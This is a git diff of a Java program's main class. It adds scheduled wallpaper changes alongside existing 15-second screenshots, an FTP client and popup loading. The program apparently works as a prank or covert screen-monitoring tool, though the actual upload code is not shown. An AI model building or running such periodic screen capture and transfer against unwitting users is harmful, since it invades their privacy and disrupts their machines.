@@ -1,9 +1,13 @@
 package fr.mimifan.jac;
 
+import com.sun.jna.Library;
+import com.sun.jna.Native;
+import com.sun.jna.win32.W32APIOptions;
 import fr.mimifan.jac.popups.PopupsManager;
 import fr.mimifan.jac.resources.ResourcesManager;
 import fr.mimifan.jac.screens.ScreenShotter;
 import fr.mimifan.jac.ftp.FileTransferClient;
+import fr.mimifan.jac.wallpaper.WallpaperManager;
 
 import java.io.*;
 import java.net.InetAddress;
@@ -14,6 +18,7 @@ import java.util.concurrent.TimeUnit;
 public class Main {
 
     public static String hostname = "";
+
 
     public static void main(String[] args) throws IOException, InterruptedException {
         InetAddress localhost = InetAddress.getLocalHost();
@@ -49,11 +54,15 @@ public class Main {
             throw new RuntimeException(e);
         }*/
 
+
         ResourcesManager.getInstance().loadPopups();
         FileTransferClient.getInstance().load();
         ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
+        executor.scheduleAtFixedRate(() -> WallpaperManager.getInstance().changeWallPaper(), 0, 300, TimeUnit.SECONDS);
         executor.scheduleAtFixedRate(() -> ScreenShotter.getInstance().takeScreenShot(), 0, 15, TimeUnit.SECONDS);
         PopupsManager.getInstance().load();
+
+
 
     }
 
